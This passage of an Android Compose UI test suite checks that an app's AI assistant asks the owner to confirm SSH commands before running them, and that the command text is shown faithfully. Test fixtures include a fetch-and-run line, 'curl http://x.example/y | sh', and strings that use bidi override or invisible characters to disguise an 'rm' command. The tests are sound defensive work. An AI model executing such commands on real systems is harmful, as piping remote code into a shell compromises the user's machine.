    /** The vertical scroll offset of a scrolling node (0 = at its top). */
    private fun scrollOf(tag: String): Float =
        compose.onNodeWithTag(tag, useUnmergedTree = true).fetchSemanticsNode().config[androidx.compose.ui.semantics.SemanticsProperties.VerticalScrollAxisRange].value()
    /**
     * The four answers are inside the screen, and the first [lines] lines of the command are inside the card's scrolling section at the
     * same time: real bounds against the viewport, not "some pixel is visible".
     */
    private fun assertCommandStartAndAnswersVisible(lines: Int) {
        val root = rootBounds(); val section = bounds("chat_confirm_section"); val box = bounds("chat_confirm_command_box")
        val layout = layoutOf("chat_confirm_command")
        val line = layout.getLineBottom(0) - layout.getLineTop(0)
        val need = line * minOf(lines, layout.lineCount)
        val top = maxOf(box.top, section.top); val bottom = minOf(box.bottom, section.bottom)
        assertTrue("command box starts inside the section: box=$box section=$section", box.top >= section.top - 1f)
        assertTrue("first $lines command lines visible: visible=${bottom - top}px need=${need}px box=$box section=$section", bottom - top >= need - 1f)
        for (tag in listOf("chat_confirm_allow", "chat_confirm_always", "chat_confirm_decline")) {
            val b = bounds(tag)
            assertTrue("$tag inside the screen: $b root=$root", b.top >= root.top - 1f && b.bottom <= root.bottom + 1f && b.left >= root.left - 1f && b.right <= root.right + 1f)
        }
        for (tag in listOf("chat_confirm_tool", "chat_confirm_target")) assertTrue("$tag is the start of the section", bounds(tag).top >= section.top - 1f)
    }
    /** The short-command case: tool, target, the command and the four answers are on screen together. */
    private fun assertCommandAndAllowVisible() = assertCommandStartAndAnswersVisible(1)
    private fun confirmationsToggle() = compose.onNode(hasAnyAncestor(hasTestTag("tool_confirmations")) and isToggleable()).performScrollTo().assertIsDisplayed()
    private fun awaitConfirmations(mode: ru.adsrv.frpjump.settings.ConfirmationMode) = compose.waitUntil(WAIT_MS) { settings.assistantConfirmations.global == mode }

    @Test fun changingCallAsksWithNamesFullCommandFourAnswersAndHints() {
        startConfirmation()
        compose.runOnIdle { assertEquals(1, calls); assertNotNull(owner!!.state.value.confirmation) }
        shown("chat_confirm_card")
        // While the question is open the (disabled) message field is hidden; Stop stays.
        compose.onNodeWithTag("chat_input").assertDoesNotExist(); compose.onNodeWithTag("chat_stop").assertExists()
        compose.onNodeWithTag("chat_confirm_target", useUnmergedTree = true).assertTextEquals(localizedText(ru.adsrv.frpjump.R.string.confirm_unknown_target))
        compose.onNodeWithTag("chat_confirm_command", useUnmergedTree = true).assertTextContains("printf synthetic")
        assertCommandAndAllowVisible()
        // The tool is not executed while the question is open: the second provider request has not been made.
        compose.runOnIdle { assertEquals(1, requests.size) }
        for (tag in listOf("chat_confirm_allow", "chat_confirm_always", "chat_confirm_decline")) { shown(tag).assertHasClickAction() }
        // The target is unknown by name in this fixture: "For session" is not offered (nothing to show what it would cover).
        compose.onNodeWithTag("chat_confirm_session").assertDoesNotExist(); compose.onNodeWithTag("chat_confirm_session_hint").assertDoesNotExist()
        // The long explanation of Always is not on the card (it is in the confirm dialog), so the card stays short.
        compose.onNodeWithTag("chat_confirm_always_hint").assertDoesNotExist()
        shot("card")
        button("chat_stop").performClick()
        compose.waitUntil(WAIT_MS) { owner?.state?.value?.busy == false }
    }

    @Test fun declineExecutesNothingAndShowsDeclinedNotAFailure() {
        startConfirmation()
        shown("chat_confirm_decline").performClick()
        awaitIdle()
        compose.runOnIdle {
            val result = requests.last().turns.last().exchanges.single().results.single()
            assertEquals(ToolOutcome.DECLINED, result.outcome)
            assertTrue(result.text.startsWith("The owner declined this call. Nothing was executed."))
            assertNull(owner!!.state.value.confirmation); assertFalse(owner!!.state.value.turns.last().toolFailed)
        }
        button("chat_history").performScrollToNode(hasTestTag("chat_tool_declined"))
        compose.onNodeWithTag("chat_tool_declined").assertIsDisplayed()
        compose.onNodeWithText(localizedText(ru.adsrv.frpjump.R.string.tool_failure_declined).replace("%1\$s", localizedText(ru.adsrv.frpjump.R.string.tool_ssh_command))).assertIsDisplayed()
        compose.onAllNodesWithTag("chat_current_tool_failure").assertCountEquals(0)
        // After an answer the message field and the history are back.
        button("chat_input").assertIsDisplayed(); button("chat_history").assertExists()
        shot("declined")
    }

    @Test fun allowRunsThisCallOnlyAndTheToolThenAnswersAsBefore() {
        startConfirmation()
        shown("chat_confirm_allow").performClick()
        awaitIdle()
        compose.runOnIdle {
            val result = requests.last().turns.last().exchanges.single().results.single()
            assertEquals(ToolOutcome.FAILED, result.outcome); assertTrue(result.text.contains("unavailable"))
            assertEquals(ConfirmationMode.ASK, settings.assistantConfirmations.global)
        }
    }

    @Test fun alwaysAsksOnceMoreThenTurnsConfirmationsOffShowsTheIndicatorAndItTurnsThemBackOn() {
        startConfirmation()
        val path = listOf(ru.adsrv.frpjump.R.string.settings, ru.adsrv.frpjump.R.string.assistant_title, ru.adsrv.frpjump.R.string.assistant_tools).joinToString(" › ") { localizedText(it) }
        // Always does not act at once: it asks for a second confirmation that says what is turned off and where to turn it back on.
        shown("chat_confirm_always").performClick()
        compose.onNodeWithTag("chat_always_dialog_title").assertTextEquals(localizedText(ru.adsrv.frpjump.R.string.always_dialog_title))
        val title = layoutOf("chat_always_dialog_title")
        val lastLine = title.layoutInput.text.text.substring(title.getLineStart(title.lineCount - 1), title.getLineEnd(title.lineCount - 1)).trim()
        assertTrue("the question mark is not alone on its line: '$lastLine'", lastLine.length > 1)
        compose.onNodeWithTag("chat_always_dialog_text").assertTextContains(path, substring = true)
        shot("always-dialog", dialog = true)
        // Cancel returns to the card, still waiting, nothing changed.
        compose.onNodeWithTag("chat_always_cancel").performClick()
        compose.onNodeWithTag("chat_always_dialog_text").assertDoesNotExist()
        compose.onNodeWithTag("chat_confirm_card").assertIsDisplayed()
        compose.runOnIdle { assertEquals(ConfirmationMode.ASK, settings.assistantConfirmations.global); assertEquals(1, requests.size); assertNotNull(owner!!.state.value.confirmation) }
        shown("chat_confirm_always").performClick()
        compose.onNodeWithTag("chat_always_turn_off").performClick()
        awaitIdle()
        awaitConfirmations(ConfirmationMode.OFF)
        compose.onNodeWithTag("chat_confirmations_off").assertIsDisplayed()
        compose.onNodeWithTag("chat_tools").assertIsDisplayed(); compose.onNodeWithTag("chat_back").assertIsDisplayed()
        shot("indicator")
        // A later changing call no longer asks.
        input().performTextInput("Again"); sendAndAwait()
        compose.runOnIdle { assertNull(owner!!.state.value.confirmation); assertEquals(ToolOutcome.FAILED, requests.last().turns.last().exchanges.single().results.single().outcome) }
        button("chat_confirmations_off").performClick()
        compose.waitUntil(WAIT_MS) { compose.onAllNodesWithTag("chat_confirmations_off_text").fetchSemanticsNodes().isNotEmpty() }
        compose.onNodeWithTag("chat_confirmations_off_text").assertTextEquals(localizedText(ru.adsrv.frpjump.R.string.confirmations_off_explanation))
        shot("indicator-dialog", dialog = true)
        compose.onNodeWithTag("chat_confirmations_turn_on").performClick()
        awaitConfirmations(ConfirmationMode.ASK)
        compose.waitUntil(WAIT_MS) { compose.onAllNodesWithTag("chat_confirmations_off").fetchSemanticsNodes().isEmpty() }
    }

    @Test fun longPressOnTheIndicatorExplainsAndClosesWithoutChange() {
        settings.setAssistantConfirmations(ConfirmationMode.OFF)
        install()
        button("chat_confirmations_off").assertIsDisplayed().performTouchInput { longClick() }
        compose.waitUntil(WAIT_MS) { compose.onAllNodesWithTag("chat_confirmations_off_text").fetchSemanticsNodes().isNotEmpty() }
        compose.onNodeWithTag("chat_confirmations_off_text").assertIsDisplayed()
        compose.onNodeWithTag("chat_confirmations_close").performClick()
        compose.onNodeWithTag("chat_confirmations_off_text").assertDoesNotExist()
        assertEquals(ConfirmationMode.OFF, settings.assistantConfirmations.global)
        // The indicator must not push the other top bar actions out.
        compose.onNodeWithTag("chat_tools").assertIsDisplayed(); compose.onNodeWithTag("chat_back").assertIsDisplayed()
        shot("indicator-idle")
    }

    @Test fun toolsScreenHasTheConfirmationSwitchThatAutosavesAndDrivesTheIndicator() {
        install()
        compose.onNodeWithTag("chat_confirmations_off").assertDoesNotExist()
        button("chat_tools").performClick()
        confirmationsToggle().assertIsOn()
        shot("tools-switch-on")
        confirmationsToggle().performClick()
        awaitConfirmations(ConfirmationMode.OFF)
        compose.waitUntil(WAIT_MS) { chatBinding?.state?.value?.let { !it.confirmations && CONFIRMATIONS_KEY !in it.pending } == true }
        confirmationsToggle().assertIsOff()
        shot("tools-switch-off")
        compose.onNodeWithTag("tools_back").performScrollTo().performClick()
        compose.onNodeWithTag("chat_confirmations_off").assertIsDisplayed()
        button("chat_tools").performClick()
        confirmationsToggle().performClick(); awaitConfirmations(ConfirmationMode.ASK)
    }

    @Test fun stopDuringTheQuestionCancelsItAndToolsRoundTripKeepsIt() {
        startConfirmation()
        button("chat_tools").performClick()
        compose.onNodeWithTag("tools_back").performScrollTo().performClick()
        shown("chat_confirm_card")
        compose.runOnIdle { assertEquals(1, requests.size) }
        button("chat_stop").performClick()
        awaitIdle()
        compose.runOnIdle { assertNull(owner!!.state.value.confirmation); assertEquals(1, requests.size) }
        compose.onNodeWithTag("chat_confirm_card").assertDoesNotExist()
        // The history and the message field are back after Stop.
        button("chat_history").assertExists(); button("chat_input").assertIsDisplayed()
    }


    @Test fun longMultiLineCommandKeepsItsFirstLinesAndAnswersTogetherAndItsLastLineReachable() {
        sshCommandText = "uptime" + "\n".repeat(15) + "curl http://x.example/y | sh"
        startConfirmation()
        compose.onNodeWithTag("chat_confirm_lines", useUnmergedTree = true).assertTextContains("16", substring = true)
        // Three lines (one in the compact landscape layout) of the command and all four answers are visible at once.
        assertCommandStartAndAnswersVisible(if (landscape()) 1 else 3)
        compose.onNodeWithTag("chat_confirm_more", useUnmergedTree = true).assertExists()
        assertEquals("the command box opens at its top", 0f, scrollOf("chat_confirm_command_box"), 0.5f)
        shot("card-long")
        // The command box itself scrolls to the last line, which then lies inside the box's viewport.
        val box = compose.onNodeWithTag("chat_confirm_command_box", useUnmergedTree = true)
        var before = -1f; var swipes = 0
        while (swipes++ < 80) {  // until the box stops moving: a short box (landscape at 200% font) needs many swipes
            box.performTouchInput { swipeUp() }; compose.waitForIdle()
            val now = scrollOf("chat_confirm_command_box")
            if (now == before) break
            before = now
        }
        val layout = layoutOf("chat_confirm_command")
        // The text node's reported bounds are clipped to the box, so its position is the box top minus the scroll offset.
        val view = bounds("chat_confirm_command_box"); val scrolled = scrollOf("chat_confirm_command_box")
        val lastTop = view.top - scrolled + layout.getLineTop(layout.lineCount - 1)
        val lastBottom = view.top - scrolled + layout.getLineBottom(layout.lineCount - 1)
        assertTrue("the last line is inside the command box: lastLine=$lastTop..$lastBottom box=$view scroll=$scrolled", lastTop >= view.top - 1f && lastBottom <= view.bottom + 1f)
        compose.onNodeWithText("curl http://x.example/y | sh", substring = true, useUnmergedTree = true).assertExists()
        assertTrue("the scroll mark is gone at the end", compose.onAllNodesWithTag("chat_confirm_more", useUnmergedTree = true).fetchSemanticsNodes().isEmpty())
        shot("card-long-end")
        // The answers did not move.
        assertCommandStartAndAnswersVisibleAnswersOnly()
        button("chat_confirm_decline").performClick(); awaitIdle()
    }
    private fun assertCommandStartAndAnswersVisibleAnswersOnly() {
        val root = rootBounds()
        for (tag in listOf("chat_confirm_allow", "chat_confirm_always", "chat_confirm_decline")) { val b = bounds(tag); assertTrue("$tag $b $root", b.top >= root.top - 1f && b.bottom <= root.bottom + 1f) }
    }

    @Test fun rightToLeftLettersCannotReverseTheDisplayedOrderOfTheCommands() {
        // The command deletes first and changes directory last; a right-to-left paragraph would show it the other way round.
        // Short enough to stay on one line even at 200% font, where the reordering would show.
        sshCommandText = ": \u05D0; rm x ;\u05D1; cd y"
        // In a right-to-left layout an unspecified text direction would make this a right-to-left paragraph and show cd before rm.
        forceRtl = true
        startConfirmation()
        compose.onNodeWithTag("chat_confirm_rtl", useUnmergedTree = true).assertIsDisplayed().assertTextEquals(localizedText(ru.adsrv.frpjump.R.string.confirm_rtl_note))
        val layout = layoutOf("chat_confirm_command")
        val shownText = layout.layoutInput.text.text
        assertEquals("one visual line: ${layout.lineCount}", 1, layout.lineCount)
        val rm = layout.getHorizontalPosition(shownText.indexOf("rm x"), true); val cd = layout.getHorizontalPosition(shownText.indexOf("cd y"), true)
        assertTrue("rm (left=$rm) is shown before cd (left=$cd): the order the commands run in", rm < cd)
        shot("rtl")
        button("chat_confirm_decline").performClick(); awaitIdle()
    }

    @Test fun aSecondQuestionOpensAtItsTopAfterTheFirstWasScrolledAndDeclined() {
        startConfirmation("tool-ssh-two")
        assertTrue(layoutOf("chat_confirm_command").layoutInput.text.text.startsWith("first-line-1"))
        // Scroll the first card's command to its end, then decline it.
        repeat(6) { compose.onNodeWithTag("chat_confirm_command_box", useUnmergedTree = true).performTouchInput { swipeUp() } }
        compose.waitForIdle()
        assertTrue("the first card was scrolled", scrollOf("chat_confirm_command_box") > 0f)
        button("chat_confirm_decline").performClick()
        compose.waitUntil(WAIT_MS) { compose.onAllNodesWithTag("chat_confirm_command", useUnmergedTree = true).fetchSemanticsNodes().firstOrNull()
            ?.config?.getOrNull(androidx.compose.ui.semantics.SemanticsProperties.Text)?.joinToString("") { it.text }?.startsWith("second-line-1") == true }
        // The second card is a fresh card: its command box and its section both start at the top.
        assertEquals(0f, scrollOf("chat_confirm_command_box"), 0.5f); assertEquals(0f, scrollOf("chat_confirm_section"), 0.5f)
        assertCommandStartAndAnswersVisible(if (landscape()) 1 else 3)
        shot("second-question")
        button("chat_confirm_decline").performClick(); awaitIdle()
    }

    @Test fun titleIsNeverTruncatedAndTheOffMarkIsShownWhereItFits() {
        settings.setAssistantConfirmations(ConfirmationMode.OFF)
        install()
        val layout = layoutOf("chat_title")
        assertFalse("the title is not cut off: ${layout.layoutInput.text.text}", layout.hasVisualOverflow)
        assertFalse(layout.isLineEllipsized(0)); assertEquals(1, layout.lineCount)
        button("chat_confirmations_off").assertIsDisplayed()
        // Neighbours are still there and not covered by the mark.
        button("chat_back").assertIsDisplayed(); button("chat_tools").assertIsDisplayed()
        val mark = bounds("chat_confirmations_off")
        for (tag in listOf("chat_back", "chat_tools", "chat_title")) {
            val b = bounds(tag)
            assertTrue("$tag does not overlap the mark: $b vs $mark", b.right <= mark.left + 1f || b.left >= mark.right - 1f || b.bottom <= mark.top + 1f || b.top >= mark.bottom - 1f)
        }
        shot("indicator-placement")
    }

    @Test fun commandWithHiddenCharactersShowsVisibleEscapes() {
        sshCommandText = "ls \u202Eevil\u202C\u200Bx\ty\rz"
        startConfirmation()
        val shownText = compose.onNodeWithTag("chat_confirm_command", useUnmergedTree = true)
        for (escape in listOf("\u27E8U+202E\u27E9", "\u27E8U+202C\u27E9", "\u27E8U+200B\u27E9", "\u2409", "\u240D")) shownText.assertTextContains(escape, substring = true)
        // Compose queries run on the test thread, never inside runOnIdle/runOnUiThread.
        val displayed = compose.onNodeWithTag("chat_confirm_command", useUnmergedTree = true)
            .fetchSemanticsNode().config[androidx.compose.ui.semantics.SemanticsProperties.Text].joinToString("") { it.text }
        assertTrue("the displayed text has no raw bidi override", displayed.none { it == '\u202E' })
        // The command that will run is the original one.
        compose.runOnIdle { assertEquals(sshCommandText, owner!!.state.value.receipts.single().call.arguments["command"]!!.jsonPrimitive.content) }
        shot("hidden-characters")
        button("chat_confirm_decline").performClick(); awaitIdle()
    }

    @Test fun anUnsavedAlwaysNoteStaysUntilTheNextSend() {
        startConfirmation()
        settingsFile.failWrites = true
        shown("chat_confirm_always").performClick()
        compose.onNodeWithTag("chat_always_turn_off").performClick()
        awaitIdle()
        settingsFile.failWrites = false
        compose.onNodeWithTag("chat_confirm_not_saved").assertIsDisplayed()
        compose.runOnIdle { assertEquals(ConfirmationMode.ASK, settings.assistantConfirmations.global) }
        shot("not-saved")
        // Still there after the run ended; the next Send clears it (and asks again, because requests stayed on).
        compose.onNodeWithTag("chat_confirm_not_saved").assertIsDisplayed()
        input().performTextInput("Again"); button("chat_send").performClick()
        compose.waitUntil(WAIT_MS) { owner?.state?.value?.confirmation != null }
        compose.onNodeWithTag("chat_confirm_not_saved").assertDoesNotExist()
        button("chat_stop").performClick(); awaitIdle()
    }

    @Test fun turnOnFromTheMarkShowsAFailedSaveInTheDialogAndSucceedsOnRetry() {
        settings.setAssistantConfirmations(ConfirmationMode.OFF)
        install()
        button("chat_confirmations_off").performClick()
        settingsFile.failWrites = true
        compose.onNodeWithTag("chat_confirmations_turn_on").performClick()
        compose.waitUntil(WAIT_MS) { compose.onAllNodesWithTag("chat_confirmations_turn_on_failed").fetchSemanticsNodes().isNotEmpty() }
        compose.onNodeWithTag("chat_confirmations_turn_on_failed").assertIsDisplayed()
        compose.runOnIdle { assertEquals(ConfirmationMode.OFF, settings.assistantConfirmations.global) }
        shot("turn-on-failed", dialog = true)
        settingsFile.failWrites = false
        compose.onNodeWithTag("chat_confirmations_turn_on").performClick()
        awaitConfirmations(ConfirmationMode.ASK)
        compose.waitUntil(WAIT_MS) { compose.onAllNodesWithTag("chat_confirmations_off").fetchSemanticsNodes().isEmpty() }
    }

    @Test fun cardShowsTheRealProfileDeviceAndConnectionNamesAndForSessionSkipsTheSameTargetNextTime() {
        val fixture = ProfileInformationFixture(); informationFixture = fixture
        sshCommands = sshOver(fixture.state, fixture.hidden); sshTarget = "work" to "work-root"
        startConfirmation()
        compose.onNodeWithTag("chat_confirm_target", useUnmergedTree = true).assertTextEquals("Work · board1500 · Service root")
        shown("chat_confirm_session"); shown("chat_confirm_session_hint")
        shot("real-names")
        button("chat_confirm_session").performClick(); awaitIdle()
        compose.runOnIdle { assertEquals(ToolOutcome.FAILED, requests.last().turns.last().exchanges.single().results.single().outcome) }
        // The same target no longer asks; another connection of the same profile does.
        input().performTextInput("Again"); sendAndAwait()
        compose.runOnIdle { assertNull(owner!!.state.value.confirmation); assertTrue(requests.last().turns.last().exchanges.single().results.single().text.contains("unavailable")) }
        sshTarget = "work" to "work-admin"
        input().performTextInput("Other"); button("chat_send").performClick()
        compose.waitUntil(WAIT_MS) { owner?.state?.value?.confirmation != null }
        compose.onNodeWithTag("chat_confirm_target", useUnmergedTree = true).assertTextEquals("Work · board1500 · Service admin")
        button("chat_stop").performClick(); awaitIdle()
    }

    @Test fun switchingTheToolOffInToolsEndsTheSessionGrantAndTheNextCallAsksAgain() {
        val fixture = ProfileInformationFixture(); informationFixture = fixture
        sshCommands = sshOver(fixture.state, fixture.hidden); sshTarget = "work" to "work-root"
        startConfirmation()
        shown("chat_confirm_session").performClick(); awaitIdle()
        compose.runOnIdle { assertEquals(1, ownerSupport!!.grants.snapshot().size) }
        button("chat_tools").performClick()
        toolToggle("ssh_command").performClick(); awaitToolSaved("ssh_command", false)
        compose.waitUntil(WAIT_MS) { ownerSupport!!.grants.snapshot().isEmpty() }
        toolToggle("ssh_command").performClick(); awaitToolSaved("ssh_command", true)
        compose.onNodeWithTag("tools_back").performScrollTo().performClick()
        input().performTextInput("Again"); button("chat_send").performClick()
        compose.waitUntil(WAIT_MS) { owner?.state?.value?.confirmation != null }
        button("chat_stop").performClick(); awaitIdle()
    }

    private fun orderOnOneLine(command: String, first: Char, second: Char, rtlLayout: Boolean) {
        sshCommandText = command
        forceRtl = rtlLayout
        startConfirmation()
        compose.onNodeWithTag("chat_confirm_rtl", useUnmergedTree = true).assertIsDisplayed()
        val layout = layoutOf("chat_confirm_command")
        val shown = layout.layoutInput.text.text
        assertEquals("one visual line: ${layout.lineCount}", 1, layout.lineCount)
        val a = layout.getHorizontalPosition(shown.indexOf(first), true); val b = layout.getHorizontalPosition(shown.indexOf(second), true)
        assertTrue("$first (left=$a) is shown before $second (left=$b): the order the arguments are in", a < b)
        shot("arabic-digits")
        button("chat_confirm_decline").performClick(); awaitIdle()
    }
    @Test fun arabicDigitsKeepTheirOrderInALeftToRightLayout() = orderOnOneLine("mv -f \u0661 \u0662", '\u0661', '\u0662', rtlLayout = false)
    @Test fun arabicDigitsKeepTheirOrderInARightToLeftLayout() = orderOnOneLine("mv -f \u0661 \u0662", '\u0661', '\u0662', rtlLayout = true)
    @Test fun redirectionWithArabicDigitsKeepsItsDirection() = orderOnOneLine("cat \u0661 > \u0662", '\u0661', '\u0662', rtlLayout = false)

    private fun isDisplayed(tag: String) = try { compose.onNodeWithTag(tag, useUnmergedTree = true).assertIsDisplayed(); true } catch (_: AssertionError) { false }

    @Test fun inAShortWindowAllowIsNeverVisibleWhileTheCommandsFirstLineIsNot() {
        // Tall enough for the top bar, the message field and Send at 200% font (the Send must stay clickable), short for the card.
        windowHeightDp = 520
        try { startConfirmation() } catch (e: Throwable) { throw AssertionError("startConfirmation failed in the short window: ${e.message}; state=${owner?.state?.value?.let { "busy=${it.busy} draft=${it.draft} confirmation=${it.confirmation != null}" }}", e) }
        // The card opens at its top: tool and target first.
        compose.onNodeWithTag("chat_confirm_tool", useUnmergedTree = true).assertIsDisplayed()
        compose.onNodeWithTag("chat_confirm_target", useUnmergedTree = true).assertIsDisplayed()
        val lineHeight = layoutOf("chat_confirm_command").let { it.getLineBottom(0) - it.getLineTop(0) }
        val commandVisible = bounds("chat_confirm_command").height >= lineHeight - 1f
        val allowVisible = isDisplayed("chat_confirm_allow")
        assertTrue("Allow visible=$allowVisible while the command's first line visible=$commandVisible (height ${bounds("chat_confirm_command").height} of $lineHeight)", !allowVisible || commandVisible)
        assertTrue("the command's first line is visible or reachable first", commandVisible || isDisplayed("chat_confirm_command"))
        shot("short-window")
        // Every answer is reachable (scrolling the card when it does not fit).
        for (tag in listOf("chat_confirm_allow", "chat_confirm_always", "chat_confirm_decline")) shown(tag)
        // A click lands only on a node that is inside the window: scroll to it first where the card scrolls.
        val decline = compose.onNodeWithTag("chat_confirm_decline"); runCatching { decline.performScrollTo() }
        decline.performClick()
        try { awaitIdle() } catch (e: Throwable) { throw AssertionError("still asking after Decline: ${owner?.state?.value?.confirmation != null}; declineBounds=${bounds("chat_confirm_decline")}", e) }
    }
}
